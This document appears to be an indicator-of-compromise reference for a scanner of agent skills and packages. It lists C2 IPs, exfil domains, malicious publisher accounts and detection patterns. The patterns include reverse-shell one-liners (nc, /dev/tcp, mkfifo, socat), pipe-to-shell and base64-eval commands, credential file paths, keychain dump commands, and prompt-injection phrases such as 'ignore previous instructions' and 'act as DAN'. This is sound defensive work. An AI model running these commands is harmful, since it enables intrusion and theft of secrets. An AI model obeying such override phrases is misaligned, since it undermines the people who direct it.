# Known Malicious Patterns & IOC Reference

## C2 IP Addresses

| Campaign | IPs |
|----------|-----|
| ClawHavoc | 91.92.242.30, 95.92.242.30, 96.92.242.30, 54.91.154.110, 202.161.50.59 |
| GhostSocks/PureLogs | 185.196.9.98, 121.127.33.212 (+ ~20 more in full ioc.rs list) |
| SANDWORM_MODE | 45.33.32.100, 103.224.212.44, 198.51.100.78 |
| Lazarus XPACK | 185.29.10.88, 91.109.176.41 |

## Malicious Domains

| Domain | Category |
|--------|----------|
| install.app-distribution.net | ClawHavoc AMOS dropper |
| serverconect.cc | C2 |
| socifiapp.com | C2 |
| webhook.site | Exfil service |
| pipedream.net | Exfil service |
| requestbin.com | Exfil service |
| hookbin.com | Exfil service |
| burpcollaborator.net | OAST (out-of-band attack surface testing) |
| interact.sh | OAST |

## Malicious Publishers

| Campaign | Publisher Accounts |
|----------|--------------------|
| ClawHavoc | hightower6eu, sakaen736jih, davidsmorais |
| Bloom/JFrog | zaycv, noreplyboter, rjnpage, aslaep123, gpaitai |
| Snyk | clawdhub1, Ddoy233 |
| Fake Installer | openclaw-installer, install-openclaw, simple-claw |
| SANDWORM | sandworm-npm-actor1, sandworm-npm-actor2 |
| Lazarus | lazarus-bigmath, lazarus-graphalgo |
| MCP Rug Pull | postmark-mcp-actor |

## Suspicious Code Patterns

### Remote Execution

| Pattern | Example / Signal |
|---------|-----------------|
| Pipe to shell | `curl ... \| sh`, `wget ... \| bash` |
| Base64 decode + eval | `echo <b64> \| base64 -d \| bash`, `eval(atob(...))` |
| Reverse shell (netcat) | `nc -e /bin/sh`, `nc -e cmd.exe` |
| Reverse shell (/dev/tcp) | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
| Reverse shell (mkfifo) | `mkfifo /tmp/f; ... /tmp/f \| /bin/sh` |
| Reverse shell (socat) | `socat exec:'bash -li',pty,... TCP:<ip>:<port>` |

### Credential Access

| Pattern | Signal |
|---------|--------|
| SSH key theft | File access to `~/.ssh/id_rsa`, `~/.ssh/authorized_keys` |
| AWS credential theft | File access to `~/.aws/credentials`, `~/.aws/config` |
| macOS Keychain dump | `security find-generic-password`, `security dump-keychain` |
| Browser credential files | Access to Chrome/Firefox profile dirs with Login Data |

### Data Exfiltration

| Pattern | Signal |
|---------|--------|
| Env var bulk dump | `os.environ` iteration followed by network call |
| Env var bulk dump (Node) | `process.env` serialized and sent outbound |
| POST to exfil domain | HTTP POST to webhook.site, pipedream.net, requestbin.com, hookbin.com |
| DNS exfil | DNS lookups with base64/hex encoded subdomains |

### SKILL.md Social Engineering

| Pattern | Risk |
|---------|------|
| "paste this in terminal" | Prompt injection leading to RCE |
| "run as root" / `sudo` instructions without justification | Privilege escalation via social engineering |
| "ignore previous instructions" | Direct prompt injection attempt |
| "act as DAN" / jailbreak phrases | LLM override attempt |
| Inline shell commands embedded in markdown steps | Disguised execution |

## Quick Reference: Risk Severity Mapping

| Finding | Severity |
|---------|----------|
| Known C2 IP match | CRITICAL |
| Known malicious domain match | CRITICAL |
| Known malicious publisher match | HIGH |
| Reverse shell pattern detected | CRITICAL |
| Credential file access pattern | HIGH |
| Env var bulk exfil pattern | HIGH |
| Pipe to shell (curl/wget) | HIGH |
| OAST domain contact | MEDIUM |
| Exfil service domain | MEDIUM |
| SKILL.md prompt injection | HIGH |
| SKILL.md social engineering | MEDIUM |
